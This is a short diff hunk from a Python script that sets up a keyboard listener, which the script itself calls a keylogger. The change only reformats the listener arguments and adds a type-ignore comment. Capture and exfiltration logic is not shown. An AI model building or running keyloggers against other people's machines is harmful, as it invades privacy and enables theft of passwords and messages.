@@ -29,8 +29,8 @@ def on_release(key):
 
 # Set up the listener
 with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
+    on_press=on_press,
+    on_release=on_release) as listener: # type: ignore
     print("Keylogger started. Press 'Esc' to stop.")
     listener.join()
 
